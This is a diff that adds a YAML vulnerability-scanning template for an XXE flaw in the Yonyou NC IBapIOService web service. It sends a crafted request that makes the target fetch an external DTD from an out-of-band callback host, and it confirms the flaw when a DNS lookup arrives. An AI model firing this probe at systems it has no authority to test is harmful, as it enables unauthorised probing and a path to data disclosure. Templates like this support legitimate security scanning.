@@ -1,0 +1,22 @@
+id: poc-yaml-yongyou-nc-ibapioservice-xxe
+info:
+  name: 用友NC IBapIOService XXE漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,xxe
+
+variables:
+  reverse_dns: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /uapws/service/nc.itf.bap.service.IBapIOService?xsd=http://{{reverse_dns}}/ext.dtd HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
